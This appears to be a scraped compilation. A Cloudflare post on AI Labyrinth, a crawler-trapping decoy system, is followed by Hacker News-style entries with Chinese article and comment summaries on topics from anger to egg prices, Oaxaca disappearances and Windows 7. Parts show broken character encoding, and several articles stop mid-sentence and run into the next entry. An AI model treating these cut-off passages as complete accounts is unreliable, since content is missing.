Reid Tatoris
Harsh Saxena
Luis Miglietti
5 min read
Today, weâre excited to announce AI Labyrinth, a new mitigation approach that uses AI-generated content to slow down, confuse, and waste the resources of AI Crawlers and other bots that donât respect âno crawlâ directives. When you opt in, Cloudflare will automatically deploy an AI-generated set of linked pages when we detect inappropriate bot activity, without the need for customers to create any custom rules.
AI Labyrinth is available on an opt-in basis to all customers, including the Free plan.
Using Generative AI as a defensive weapon
AI-generated content has exploded, reportedly accounting for
four of the top 20 Facebook posts
last fall. Additionally, Medium estimates that
47% of all content
on their platform is AI-generated. Like any newer tool it has both wonderful and
malicious
uses.
At the same time, weâve also seen an explosion of new crawlers used by AI companies to scrape data for model training. AI Crawlers generate more than 50 billion requests to the Cloudflare network every day, or just under 1% of all web requests we see. While Cloudflare has several tools for
identifying and blocking unauthorized AI crawling
, we have found that blocking malicious bots can alert the attacker that you are on to them, leading to a shift in approach, and a never-ending arms race. So, we wanted to create a new way to thwart these unwanted bots, without letting them know theyâve been thwarted.
To do this, we decided to use a new offensive tool in the bot creatorâs toolset that we havenât really seen used defensively: AI-generated content. When we detect unauthorized crawling, rather than blocking the request, we will link to a series of AI-generated pages that are convincing enough to entice a crawler to traverse them. But while real looking, this content is not actually the content of the site we are protecting, so the crawler wastes time and resources.Â
As an added benefit, AI Labyrinth also acts as a next-generation honeypot. No real human would go four links deep into a maze of AI-generated nonsense. Any visitor that does is very likely to be a bot, so this gives us a brand-new tool to identify and fingerprint bad bots, which we add to our list of known bad actors. Hereâs how we do itâ¦
How we built the labyrinthÂ
When AI crawlers follow these links, they waste valuable computational resources processing irrelevant content rather than extracting your legitimate website data. This significantly reduces their ability to gather enough useful information to train their models effectively.
To generate convincing human-like content, we used
Workers AI
with an open source model to create unique HTML pages on diverse topics. Rather than creating this content on-demand (which could impact performance), we implemented a pre-generation pipeline that sanitizes the content to prevent any XSS vulnerabilities, and stores it in R2 for faster retrieval. We found that generating a diverse set of topics first, then creating content for each topic, produced more varied and convincing results. It is important to us that we donât generate inaccurate content that contributes to the spread of misinformation on the Internet, so the content we generate is real and related to scientific facts, just not relevant or proprietary to the site being crawled.
This pre-generated content is seamlessly integrated as hidden links on existing pages via our custom HTML transformation process, without disrupting the original structure or content of the page. Each generated page includes appropriate meta directives to protect SEO by preventing search engine indexing. We also ensured that these links remain invisible to human visitors through carefully implemented attributes and styling. To further minimize the impact to regular visitors, we ensured that these links are presented only to suspected AI scrapers, while allowing legitimate users and verified crawlers to browse normally.
A graph of daily requests over time, comparing different categories of AI Crawlers.
What makes this approach particularly effective is its role in our continuously evolving bot detection system. When these links are followed, we know with high confidence that it's automated crawler activity, as human visitors and legitimate browsers would never see or click them. This provides us with a powerful identification mechanism, generating valuable data that feeds into our machine learning models. By analyzing which crawlers are following these hidden pathways, we can identify new bot patterns and signatures that might otherwise go undetected. This proactive approach helps us stay ahead of AI scrapers, continuously improving our detection capabilities without disrupting the normal browsing experience.

data.title: There's no emotion we ought to think harder about than anger
data.author: privong
data.article_summary: 本文探讨了愤怒的本质及其问题，指出愤怒既普遍存在又具有破坏性。作者引用亚里士多德的定义，愤怒是对关心事物遭受不公损害的回应，并包含对报复的期望。然而，报复并不能真正弥补损失，虽然人们常认为惩罚能带来公正，但这种想法并不合理。文章提出，愤怒的人面临三种选择：一是关注自身地位，通过报复提升自己，但这过于自我中心；二是关注原初的伤害，期望通过报复改善情况，但这逻辑上不成立；三是理性地选择第三条路，即放弃报复。文章认为，报复仅在涉及个人地位时有意义，但对真正的伤害问题无济于事。
data.comments_summary:
主要讨论点： anger的本质、功能及其处理方式

不同观点：
• jordwest认为，愤怒是人类设置个人界限的生物学本能，长期压抑愤怒是反效果的。通过允许自己表达愤怒并设定界限，能减少对世界的愤怒和有害的爆发。他认为社会教导人们压抑这种本能是不健康的。
• tibbar指出，愤怒并不一定与报复欲望相关，愤怒可以只是一种情绪，甚至可以对自己感到愤怒。同时，过度压抑愤怒也不好，因为这样会让问题重复发生，而无法给出反馈。
• voidhorse认为，愤怒是可以通过环境和经验学习的。在一个接受愤怒的家庭中长大的人可能会形成不正当的愤怒反应模式，因此照顾他人时要注意自己的行为可能对他人产生长期影响。
• 0xbadcafebee认为，愤怒是心灵感知到错误或不如意时的自然反应，本身不是坏事，但关键在于如何处理这种情绪，避免让情绪直接驱动行为。
• conartist6质疑报复作为愤怒表达方式的有效性，并引用“以牙还牙”的博弈论策略来解释愤怒的合理性。
• jkmcf简单提到参加了有关愤怒的哲学和心理学研讨会，未深入发表个人观点。
• wewewedxfgdf认为，愤怒的进化目的是为了操控或控制他人的行为。
• amriksohata引用宗教经典，认为愤怒会导致迷失和智力丧失，最终导致堕落。
• mhertenberger对文章中引用曼德拉作为例子表示反对，认为曼德拉曾是恐怖分子，并对其政治行为提出批评，认为文章对曼德拉的美化是不负责任的。

补充讨论：
• 争议焦点之一是愤怒是否与报复相关，以及如何处理愤怒。jordwest和tibbar更倾向于接受愤怒作为一种自然情绪，而conartist6和mhertenberger则对愤怒引发的行为（尤其是报复和暴力）持批判态度。
• 另一个值得注意的点是对愤怒的来源和影响的讨论，voidhorse和wewewedxfgdf强调了环境和学习对愤怒的影响，而amriksohata则从宗教角度警告愤怒的危害。
• mhertenberger的评论引入了对曼德拉历史角色的争议，虽然与主要讨论点不完全相关，但增加了讨论的政治维度。

43448408.article_content:
There’s no emotion we ought to think harder and more clearly about than anger. Anger greets most of us every day – in our personal relationships, in the workplace, on the highway, on airline trips – and, often, in our political lives as well. Anger is both poisonous and popular. Even when people acknowledge its destructive tendencies, they still so often cling to it, seeing it as a strong emotion, connected to self-respect and manliness (or, for women, to the vindication of equality). If you react to insults and wrongs without anger you’ll be seen as spineless and downtrodden. When people wrong you, says conventional wisdom, you should use justified rage to put them in their place, exact a penalty. We could call this football politics, but we’d have to acknowledge right away that athletes, whatever their rhetoric, have to be disciplined people who know how to transcend anger in pursuit of a team goal.
If we think closely about anger, we can begin to see why it is a stupid way to run one’s life. A good place to begin is Aristotle’s definition: not perfect, but useful, and a starting point for a long Western tradition of reflection. Aristotle says that anger is a response to a significant damage to something or someone one cares about, and a damage that the angry person believes to have been wrongfully inflicted. He adds that although anger is painful, it also contains within itself a hope for payback. So: significant damage, pertaining to one’s own values or circle of cares, and wrongfulness. All this seems both true and uncontroversial. More controversial, perhaps, is his idea (in which, however, all Western philosophers who write about anger concur) that the angry person wants some type of payback, and that this is a conceptual part of what anger is. In other words, if you don’t want some type of payback, your emotion is something else (grief, perhaps), but not really anger.
Is this really right? I think so. We should understand that the wish for payback can be a very subtle wish: the angry person doesn’t need to wish to take revenge herself. She may simply want the law to do so; or even some type of divine justice. Or, she may more subtly simply want the wrongdoer’s life to go badly in future, hoping, for example, that the second marriage of her betraying spouse turns out really badly. I think if we understand the wish in this broad way, Aristotle is right: anger does contain a sort of strike-back tendency. Contemporary psychologists who study anger empirically agree with Aristotle in seeing this double movement in it, from pain to hope.
The central puzzle is this: the payback idea does not make sense. Whatever the wrongful act was – a murder, a rape, a betrayal – inflicting pain on the wrongdoer does not help restore the thing that was lost. We think about payback all the time, and it is a deeply human tendency to think that proportionality between punishment and offence somehow makes good the offence. Only it doesn’t. Let’s say my friend has been raped. I urgently want the offender to be arrested, convicted, and punished. But really, what good will that do? Looking to the future, I might want many things: to restore my friend’s life, to prevent and deter future rapes. But harsh treatment of this particular wrongdoer might or might not achieve the latter goal. It’s an empirical matter. And usually people do not treat it as an empirical matter: they are in the grip of an idea of cosmic fitness that makes them think that blood for blood, pain for pain is the right way to go. The payback idea is deeply human, but fatally flawed as a way of making sense of the world.
T
here is one, and I think only one, situation in which the payback idea does make sense. That is when I see the wrong as entirely and only what Aristotle calls a ‘down-ranking’: a personal humiliation, seen as entirely about relative status. If the problem is not the injustice itself, but the way it has affected my ranking in the social hierarchy, then I really can achieve something by humiliating the wrongdoer: by putting him relatively lower, I put myself relatively higher, and if status is all I care about, I don’t need to worry that the real wellbeing problems created by the wrongful act have not been solved.
A wronged person who is really angry, seeking to strike back, soon arrives, I claim, at a fork in the road. Three paths lie before her. Path one: she goes down the path of status-focus, seeing the event as all about her and her rank. In this case her payback project makes sense, but her normative focus is self-centred and objectionably narrow. Path two: she focuses on the original offence (rape, murder, etc), and seeks payback, imagining that the offender’s suffering would actually make things better. In this case, her normative focus is on the right things, but her thinking doesn’t make sense. data.title: Safe Shell String Interpolation
data.author: Wingy
data.article_summary:
文章讨论了如何在Shell命令中安全地进行字符串插值，特别是面对不可信用户输入时避免安全漏洞。初始示例展示了使用`exec`函数构造命令的潜在风险，因为用户输入可能导致命令注入。文章建议使用`execFile`来避免Shell解析用户输入，但承认这种方法较为繁琐。

为了在继续使用Shell的情况下保持安全，文章提出通过环境变量传递输入。在JavaScript中，可以利用标签模板实现更安全的插值方法。文章提供了一个实现示例，展示了如何安全地处理用户输入并执行Shell命令。

此外，文章简要讨论了其他语言中的类似方法，例如Python中使用环境变量的方式，并提到一个未来可能实现类似功能的Python提案（PEP 750）。文章还指出Swift是目前除JavaScript外唯一支持类似功能的语言，通过扩展`ExpressibleByStringInterpolation`实现。

总之，文章强调了在Shell命令中处理用户输入时必须谨慎，并提供了多种语言中的安全处理方法。
data.comments_summary:
主要讨论点：在Python中执行shell命令时，如何安全地处理变量插值以及是否应避免使用shell进行脚本编写。

不同观点：
• telotortium认为，Python的`shlex.quote`是一个有效的工具，可以在需要使用shell时安全地插入变量。他提到可以在无法避免使用shell的情况下，直接使用`shlex.quote`来确保安全。此外，他对Python的模板字符串提案表示兴趣，认为这是未来可能的一种改进。
• js2强调应尽量避免使用shell，并建议使用`subprocess`模块来替代。他提供了一个不使用shell的管道例子，并指出在必须使用shell时，应使用`shlex.quote`来确保安全。他还展示了如何通过两次调用`subprocess.check_output`来实现相同的功能。
• amelius则从根本上反对使用为命令行优化的shell进行脚本编写。他认为shell语言在输入可信度和符号严谨性方面存在不足，尤其对不深入理解其微妙之处的用户来说非常危险。他还提到，随着用户使用LLMs生成代码，这个问题可能会变得更加严重。

补充讨论：
• telotortium和js2都提到在必须使用shell时，`shlex.quote`是一个重要的安全工具，但js2更倾向于完全避免使用shell，并展示了替代方案。
• amelius的观点更具批判性，认为shell本身就不适合用于脚本编写，并且指出了更广泛的安全和理解问题。
• 讨论中涉及的具体技术包括`shlex.quote`、`subprocess`模块、以及Python的模板字符串提案，这些都被用作支持各自观点的论据。
• 争议的焦点在于是否应完全避免使用shell进行脚本编写，以及在何种情况下可以使用`shlex.quote`来缓解安全问题。

data.title: Show HN: We made an MCP server so Cursor can debug Node.js on its own
data.author: arthurgousset
data.article_summary: 这篇文章介绍了MCP NodeJS Debugger工具（版本0.2.1），它通过MCP服务器帮助在运行时调试NodeJS代码。主要功能包括添加到Claude Code、启动调试模式、连接到NodeJS服务器并在运行时检查错误。文章提供了一个示例，演示如何使用该工具调试Mongoose连接错误。步骤包括添加调试器、设置断点、列出断点和执行代码以检查连接变量。调试器帮助开发者在运行时分析和解决问题，例如未在MongoDB Atlas集群中添加的IP地址问题。
data.comments_summary:
主要讨论点：Cursor在调试复杂项目中的表现以及可能的改进方法，特别是如何解决死循环问题、提高调试效率，以及MCP（Model Context Protocol）在LLM调试中的应用。

不同观点：
• arthurgousset认为Cursor在处理复杂项目时容易陷入死循环，通过在代码中加入`console.log`语句可以帮助摆脱死循环。他们提出让Cursor在运行时访问Node.js以改进调试过程，并分享了一个原型工具供反馈。
• mkw5053指出，通过严格的类型检查、测试驱动开发（TDD）和明确的调试步骤，可以有效提高Cursor的表现。他强调分解问题并一次只调试一个问题的方法。
• vunderba对比了Cursor和Claude Code，指出Claude Code在处理基本转译错误时表现不佳，但通过明确指导和自动化建议可以显著改进。
• wordofx分享了自己的经验，通过一次只解决一个错误成功将旧项目从Node 10升级到Node 22，表明适当的提示可以提高成功率。
• mdaniel提到MCP中的正式日志路径，指出这可能为服务消费者提供可见的调试信息，并暗示LLM也可能看到这些信息。
• pcwelder质疑调试器连接相对于日志语句的优势，认为LLM可以快速添加日志并解析大量输出。
• smcleod认为Cursor应该能够实现arthurgousset提到的功能，不需要额外安装和订阅。
• jadbox询问该方法是否适用于Bun（一个JavaScript运行时）。
• bofadeez支持这种外部反馈的方法，认为LLMs需要自我纠正推理。
• pkkkzip对这种方法持怀疑态度，认为这些工具无法解决黑盒问题的根本原因，真正的推理和意识才是前进的方向。
• flowerthoughts对MCP的讨论热潮表示怀疑，认为MCP只是JSON-RPC的一种自我描述形式，并质疑是否有机器人环存在。

补充讨论：
• 讨论中涉及的MCP（Model Context Protocol）被多次提到，但其有效性和真实应用价值受到质疑。
• 有人提到可能存在机器人环，暗示一些讨论参与者可能是自动化账户。
• 不同用户分享了各自在使用Cursor和其他LLM工具时的具体经验和技巧，提供了实际案例支持各自的观点。

争议焦点：
• Cursor在调试复杂项目时的有效性和改进方法。
• MCP的实际应用价值及其在LLM调试中的作用。
• 是否需要真正的推理和意识能力来解决死循环问题，或通过现有技术手段（如日志和调试器）足以应对。

data.title: 'Eggflation' sending US shoppers to Mexico – where $300 fines await
data.author: paulpauper
data.article_summary: 文章主要报道了美国因禽流感导致鸡蛋短缺和价格飙升的问题，被称为“蛋通胀”（eggflation）。2025年1月，近1900万只鸟类受到影响，鸡蛋价格预计上涨41%。为应对短缺，一些美国人试图从墨西哥购买便宜鸡蛋（约2美元一打），带回美国。然而，由于疾病防控原因，美国禁止从墨西哥携带新鲜鸡蛋入境，违规者可能面临300美元罚款。美国海关和边境保护局（CBP）数据显示，蛋类截获量增加了150%以上。尽管有其他国家如土耳其和韩国提供鸡蛋援助，美国人仍在为获取鸡蛋而苦苦挣扎。文章提醒旅客了解相关法规，避免不必要的处罚。
data.comments_summary:
主要讨论点：墨西哥鸡蛋进口对美国市场的影响，以及禽流感、蛋价波动和相关政策问题。

不同观点：
• **[nothercastle]**: 认为墨西哥鸡蛋质量更好，且威胁到美国鸡肉行业的垄断地位。同时，认为禽流感已经存在，墨西哥鸡蛋不会加剧其传播。
• **[headsman771]**: 引用了一个链接，指出禽流感已不再影响美国蛋价，并认为频繁传递“某物将涨价”的信息，会让消费者更易接受价格上涨，而非减少购买。

A sign in a Costco warehouse in Sheridan, Colorado, on 13 March 2025.
Photograph: David Zalubowski/AP
US-Mexico border
‘Eggflation’ sending US shoppers to Mexico – where $300 fines await
‘Egg interceptions’ are up more than 150% at some ports of entry as a US avian flu outbreak fuels shortages
Katharine Gammon
in Los Angeles
Fri 21 Mar 2025 06.00 EDT
Last modified on Fri 21 Mar 2025 17.39 EDT
Share
In grocery stores across the US, egg shelves sitting empty and desolate have become a sign of the times. A surging bird flu outbreak affected nearly 19 million birds in January alone, wiping out supply and sending prices soaring.
Officials
forecast a 41%
increase in egg prices this year in what some are calling “eggflation”. Where eggs are available, consumers are often limited in the number they can purchase at a time. Breakfast chains from Waffle House to Denny’s have added a surcharge of $0.50 for each egg served up.
The situation is driving some people to new places to source their eggs: over the southern border. US Customs and Border Protection (CBP) has intercepted an increasing number of eggs from Mexico, where a carton of a dozen costs about $2. For comparison, the cost in many parts of California is just under
$10 per dozen
, according to the United States Department of Agriculture.
Nationally, there has been a 48% increase in eggs being detained at ports of entry this fiscal year compared with the same time last fiscal year, according to CBP. In San Diego, these “egg interception” cases have increased by a whopping 158%.
Every day, more than 200,000 cars cross the border from Mexico to the United States. Some of those cars carry groceries, medications and other goods that are less expensive over the southern border.
“It’s very common for people to shop for their groceries on the Mexican side and bring them across,” said Joaquin Luken, executive director of the Smart Border Coalition, a group that helps facilitate cross-border mobility. “So a lot of them bring dry produce materials that they buy on the Mexican side.”
But the problems start with fresh items – especially eggs. Importing
raw or fresh eggs
into the US from Mexico is prohibited due to concerns about diseases such as highly pathogenic avian influenza – also known as bird flu – and another highly contagious avian illness called virulent Newcastle disease, said Roger Maier, a public affairs specialist with CBP.
And it’s not just eggs. Travelers are prohibited from bringing raw chicken, unprocessed avian products and live birds into the United States, Maier said. Even used egg cartons can spread the same diseases. There
are some
exceptions for fully cooked egg products.
That’s why anyone with agricultural products has to declare them to border officers and agriculture specialists. “Failure to declare may lead to potential fines and penalties,” said Maier. He added that most of the eggs being confiscated by border agriculture specialists are from travelers who declared the product and then abandoned them without consequence.
“There have been very few cases of people purposefully evading the inspection process/failing to declare the product,” he said. “When that happens, a $300 civil penalty is applied, and the eggs are seized.”
Once confiscated, the eggs are destroyed by officials in oven-sized incinerators. Repeat offenders can be fined up to $10,000.

Luken advises shoppers to always check the CBP’s social media sites, because items that are allowed at one time may change and be prohibited when conditions such as disease outbreaks occur in the US.
Other countries are stepping up to help the egg shortage: Turkey has agreed to sell 15,000 tons of eggs to the US through July. South Korea has also signed on to sell eggs to the US, but the myriad laws and regulations in each country around eggs makes it complicated. The USDA secretary, Brooke Rollins, said she was talking to
other countries
. “We continue to work on that issue very, very aggressively in the short term,” she said in a press conference on Thursday, “to keep getting the price of eggs down.”
That leaves Americans still struggling for their egg fix, making the southern border an attractive option.

data.title: Horror on the coast of Oaxaca, a tourist paradise plagued by mass disappearances
data.author: PaulHoule
data.article_summary: 在墨西哥瓦哈卡州的Huatulco和Zipolite等风景如画的海滩，最近发生了一系列年轻人失踪和谋杀事件，打破了当地的宁静。一名母亲报警称其女儿Jaqueline Meza在餐厅用餐时被绑架，此前1月份已有7名男子失踪，2月底又有9名年轻男子失踪，其中部分人的尸体在250英里外被发现。截至目前，共有10人失踪，仅1人生还。受害者多来自中部城市Tlaxcala，彼此居住地相近。当局正在调查可能的警察涉案。尽管悲剧频发，当地生活仍继续，旅游业仍是经济支柱。事件引发了对安全和执法不力的广泛担忧。
data.comments_summary:
主要讨论点：墨西哥Huatulco和Puerto Escondido等地的安全状况、绑架事件以及 cartel（贩毒集团）活动的影响

不同观点：
• **486sx33**：认为Huatulco曾经是一个美丽且安全的地方，贩毒集团过去不在此活跃，且有军队检查站。提到当地的历史，原住民曾被强制迁移到政府规划的网格状土地上。总体上对该地区持较为正面的回忆，但对近期情况变化表示遗憾。

• **WarOnPrivacy**：引用了一篇文章，指出Brenda Mariel Salas在Puebla被发现活着，但没有她的声明，且对案件细节如发现时间、状态、如何到达Puebla等缺乏解释。关注案件的细节和透明度问题。

• **decimalenough**：应用Occam's Razor理论，认为如果多人同时被绑架和谋杀，极有可能是贩毒集团所为，而不是随机事件。指出 cartel 经常绑架和谋杀无辜的人以传递信息，即使受害者本身没有做错什么。

• **soared**：质疑为什么十名受害者都来自同一地方，且在Puerto Escondido失踪，而尸体却被丢在外州的边界附近，认为这非常可疑，案件处理似乎被轻描淡写。

• **IceHegel**：以El Salvador为例，认为墨西哥如果采取适当措施，可能在五年内实现持久和平。对墨西哥未来持乐观态度。

• **hombre_fatal**：简短声明自己住在Puerto Escondido，但没有进一步展开讨论。

• **jajko**：认为墨西哥虽然是个美丽的旅游国家，但由于gangs的活动，感到不安全，不愿意自己和家人前往。批评一些人以低成本为由前往墨西哥旅行，认为安全风险不可接受。

补充讨论：
• 案件的透明度和细节披露不足成为关注点，尤其是受害者如何被转移到其他地方（soared, WarOnPrivacy）。
• 关于贩毒集团活动的讨论中，decimalenough认为这类大规模犯罪通常有明确目的，而非随机发生， cartel 常以无辜者为目标来传递信息。
• jajko的观点反映了一些潜在游客对墨西哥安全问题的担忧，尤其是外国游客，尽管有些游客认为风险可控（jajko, decimalenough）。
• IceHegel对墨西哥未来持乐观态度，认为可以通过适当措施实现和平，但未具体说明是哪些措施。

争议焦点：
• 案件细节不透明，尤其是受害者如何被转移到外州以及政府对此的处理方式。
• 墨西哥部分地区的安全状况，特别是 cartel 的活动是否使该地区不适合旅游或居住（jajko, 486sx33, decimalenough）。

Beatriz Guillén
Huatulco (Mexico) -
Mar 10, 2025 - 11:19
CET
Share on Whatsapp
Share on Facebook

Copy link
Jaqueline Meza was taken from the paradisiacal beaches of Oaxaca a week ago. It was her mother who raised the alert: she was kidnapped while she was having dinner in a restaurant near the beach. Seven men
disappeared from this same area
in January. Another nine young men, at the end of February. Nothing has been heard of the first group. The bodies of the second group were found 250 miles away, in another state, inside an abandoned car. What happened in between remains a mystery, but the authorities have acknowledged that they are investigating possible involvement by the police. The crimes have shattered the idea of peace on this
drop-dead gorgeous stretch of coastline
. This holiday haven for artists, destination for two million tourists a year and a favorite spot for Instagram photos is now also the scene of brutal mass disappearances.
Life goes on along the coast of Oaxaca, with the raging waves of the Pacific in the background. The usual routines go on at the beach: vendors offering massages, spicy peanuts, handmade earrings. In Zipolite, Mexico’s only official nudist beach, reggaeton and electronic music play in bars that are still running at low energy. These weeks represent a trough between the peaks of Christmas and Easter. But this year, in the interim, tragedy has struck. Between this town and Huatulco, 31 miles away, 10 people
have gone missing
. They were between 19 and 29 years old. Only one has been found alive.
On February 28, Lesly Noya, 21, and Jaqueline Meza, 23, disappeared from Zipolite. So did Raúl González and his girlfriend Yamileth López, both 28. All of them were seen for the last time, according to their families, in this town of just 1,000 residents with a reputation for being bohemian and free. “Please, I ask for your help, my daughter disappeared last night, they took her and so far we know nothing,” pleaded Andrea Cazares, Jaqueline’s mother. This is how the message ended: “Two little ones, five and three years old, are waiting for her.”
Some of the young people who went missing in Oaxaca: Rolando Evaristo, Rubén Antonio Ramos, Jacqueline Meza , Lesly Noya, Raúl Emmanuel González, Guillermo Cortes, Yamileth López and Angie Pérez.
At about the same time, two other families were crying out in despair over their children’s fate in Huatulco, a paradise spot with nine bays that is considered one of the region’s jewels in the crown. The municipal police, they said, had taken Brenda Salas, 19, and Angie Pérez, 29. The agents had reportedly beaten them and taken them to another place, according to the request for help shared with journalists. Four more people went missing in the same approximate time period: Guillermo Cortés, Jonathan Uriel Calva, Marco Antonio Flores and Rolando Armando Evaristo, who were between 22 and 29 years old. It is not known where or when exactly they were taken.
The 10 young people all came from Tlaxcala, in central Mexico, and lived in towns very close to one another (Apizaco, Santa Úrsula Zimatepec, Yauquemehcan). No one has confirmed whether they all knew each other before they were taken in Oaxaca. But what is certain is that their lives came together in the end. The bodies of nine of them were found inside a black Volkswagen, on the side of the highway that connects Oaxaca with Puebla. In a strange event that no authority has yet explained, the attackers left one survivor: Brenda Salas.
It is more than a six-hour drive from where the youths were abducted to where their bodies were dropped off. How did the killers do it? Did they transport nine bodies for 250 miles or did they take them while they were still alive? If so, where were they killed? “How much power do you have to have to be able to drive across a state with a vehicle loaded with corpses? Or how much impunity?” asks a local journalist, who prefers not to give his name for security reasons.
The bodies were placed exactly at the point where Oaxaca ends and the Mexican state of Puebla begins. The intention and effect of the transfer is not a coincidence: attention was diverted from the Oaxacan coast and also from its authorities. The bodies of the young people had not yet been returned to their families and Jesús Romero, Secretary of Government of Oaxaca, was already insisting to the press: “Huatulco is a safe destination for all families, for all Oaxacans, for all travelers, and there are all the conditions here to come and travel.”
Tourists at a bar in Mazunte, Oaxaca, Mexico, on March 8, 2025.
Mónica González Islas
Tourism is a driving force and a source of hope in this southern state, where 60% of the population lives in poverty (20%, almost 600,000 people, in extreme poverty). In Huatulco and Puerto Escondido alone, the two main attractions on this stretch of coast, 50,000 jobs depend on tourism. The economic impact left by visitors i

data.title: Unofficial Windows 7 Service Pack 2
data.author: XzetaU8
data.article_summary: 这篇文章介绍了非官方的Windows 7 Service Pack 2项目，旨在提升Windows 7在现代系统上的使用体验并提供全面更新。该项目包括多个改进和更新，如截至2020年的所有更新、从Windows 10和8 backport的工具、原生USB 3.0和NVMe支持、TPM 2.0和UEFI支持等。项目还提到安装注意事项，强调必须严格遵循指引以避免系统损坏，且仅支持64位系统。对于常见问题，开发者也做出了解答，包括不支持32位系统和ESU更新的原因等。项目仍在开发中，存在已知bug，用户遇到问题可报告。
data.comments_summary:
主要讨论点：围绕Windows 7的社区项目、驱动支持、系统更新及其技术细节的讨论。

不同观点：
• [mdaniel] 认为该GitHub仓库只是微软的二进制文件集合，却附有一个"丰富"的许可证，带有讽刺意味。
• [cookiengineer] 分享了自己在Windows 7相关社区的经历，提到了多个项目和资源，如"spacedrone808"的网站、Snappy Driver Installer项目、DriverPacks以及DriverOff，并指出这些项目背后有活跃的社区，甚至涉及俄罗斯的回切软件（backporting software）社区。

data.title: The Vectrex Computer
data.author: erickhill
data.article_summary: 这篇文章讲述了作者多年寻找未果的一则关于Vectrex电脑的旧杂志报道的经历。Vectrex是一款游戏机，曾计划推出一个电脑扩展配件，包括键盘、16K ROM和16K RAM，并支持BASIC编程和多款软件。尽管该计划提到1984年初将推出五款软件，且配件如光笔和眼镜曾短暂销售，但整个电脑扩展最终未能实现。作者在病中花费数小时搜索电子杂志，终于找到了这篇报道，证实了其记忆的真实性。尽管Vectrex扩展的硬件配置在当时并不算强大，但其潜在可能性令人遐想。文章最后表达了作者对童年未实现技术的怀念。
data.comments_summary:
主要讨论点：Vectrex游戏机的特点、技术限制、市场表现及其在现代的使用情况

不同观点：
• [ChuckMcM] 对Vectrex持积极态度，表示自己非常喜欢该设备，并提到了相关历史，如Steve Ciarcia的矢量显示项目，附上了资料链接。
• [gcanyon] 认为Vectrex虽然有趣，但受限于矢量显示技术，只能绘制有限的线条，导致其市场表现不佳。
• [bsenftner] 分享了自己在Vectrex发明者Jay Smith手下工作的经历，提到Jay对游戏物理引擎的贡献，并指出Vectrex停产后他们开发的其他游戏项目。
• [NikkiA] 讨论了Vectrex存储设备的可能技术基础，推测其使用了类似于Exatron Stringy Floppy的“wafer tapes”技术。
• [leytdk] 提到了自己对Vectrex的现代化改造，使用Pi Zero驱动Vectrex的CPU和外设，展示了对该设备的持续兴趣和创新使用。

补充讨论：
• [wsintra2022] 提问Vectrex的技术限制和未能在市场上取得成功的原因，引发了对矢量显示技术局限性的讨论。
• [thomassmith65] 提到目前没有消费者级的矢量显示器，显示了对该技术在现代应用中的需求。
• [gedy] 分享了自己曾经的Vectrex经历，并表示愿意转让相关配件，展现了对 retro 硬件的兴趣。
• [ndsipa_pomu] 提到在eBay上看到高价Vectrex，质疑其高价购买的合理性，反映了Vectrex在收藏市场上的价值。
• [anthk] 强调了Vectrex使用的6809处理器在矢量图形处理上的简便性，指出了技术上的优势。
• [TMWNN] 关注Vectrex显示技术对眼睛的潜在伤害，提出了对该设备安全性的疑问。

争议焦点：
• Vectrex矢量显示技术的局限性及其市场失败的原因。gcanyon指出了技术上的限制，而ChuckMcM和bsenftner则更关注其历史意义和个人体验。
• Vectrex高价收藏的合理性。ndsipa_pomu质疑其高价购买的合理性，而其他用户则分享了其个人对该设备的积极体验。
• Vectrex显示技术的安全性。TMWNN提出了对眼睛伤害的疑问，但未有明确结论。

总结：
讨论围绕Vectrex的技术特点、市场表现、现代化应用及其在收藏市场的价值展开，参与者分享了各自的经历和观点，涉及技术优势、局限性及安全性等问题。

If you're a Vectrex fan, be prepared to mourn what never came to be…
Since I have nothing better to do as I get over an annoying head cold, I've been lying in bed today downloading every issue of
Electronic Games
magazine and converting each one into OCR searchable text. For decades I've had this nagging memory of a
Vectrex computer
announcement that never made it to production, and I was convinced it was from that publication. I owned a Vectrex at the time and would scour the game magazines for any tiny shred of news they might provide about my system. To their credit they seemed to bend over backwards to mention when a new Vectrex game hit store shelves, it just didn't happen that often enough for the Vectrex. I was usually lucky to find a couple inches of text per issue, and these were over 100 pages long each month.
But I remember reading about this supposed computer "add-on" and that the article was actually more than just a blurb and had some images. I never forgot about it. But, all these decades later I was never able to find that announcement. Every few years I'd look around and give up. I honestly started to wonder recently if I'd invented the memory.
Some of the magazine scans on Archive.org are giant unsearchable image-based PDFs so not even Google could see inside them. So, today I started to download issues one at a time, convert them to 600 dpi for OCR scanning in Adobe Acrobat and started searching for "vectrex". Over, and over, and over. Amazing what illness can spawn sometimes.
After a few hours I FOUND IT. AFTER ALL THESE YEARS!!!
Behold (in text) - the mythological
Vectrex Computer
. Supposedly it even had 5 titles ready to ship in early 1984!
Both the light pen and goggles mentioned in the article were in fact produced and sold for a brief time.
Since not everyone can see images, here is the text that matters from the article:
Believe it or not, the Vectrex stand-alone unit can now be transformed into a home computer!
With the assistance of a new keyboard developed by General Consumer Electronics, the plug-in adds 16K ROM and 16K RAM to the unit, and even incorporates a 65-key typewriter-style keyboard. Software for the computer is made on wafer-tapes, providing for 128K bytes of storage. BASIC's built into the system, and the keyboard is just the first step toward a word processor that'll be introduced in early 1984.
Five cartridges for the 1983 computer include:
The Sound Studio, a music composition aid
Exploring the Solar System
Create-A-Game/Maze, which teaches the user to program his very own video-entertainment
Basic Animation Domination
Basic Science, a game teaching the fundamental concepts of physics
A 65-key keyboard would have been one less key than a Commodore 64. I have no idea what "wafer-tape" storage is, but 128K storage sounds pretty interesting for the timeframe. A typical 5.25" floppy disk could hold ~170KB per side and a datasette cassette could hold about 100KB per side.
The Vectrex has 1KB of RAM and 8KB of ROM. So this computer would have beefed it up to a knee-buckling 17KB of RAM. That seems a little light given the fact the C64 and Atari 800xl were already on the market with 64KB. Regardless, the games the Vectrex had already had impressive visuals and sound even with such meager system stats thanks to cartridge storage, so who knows what may have been possible?
I remember being so excited as a kid when I read that news. Sad it never came to pass, but I'm really glad I finally rediscovered the article and it wasn't a human intelligence (HI) hallucination!

data.title: Hack: 6M Records for Sale Exfiltrated from Oracle Cloud Affecting 140k+ Tenants
data.author: gnabgib
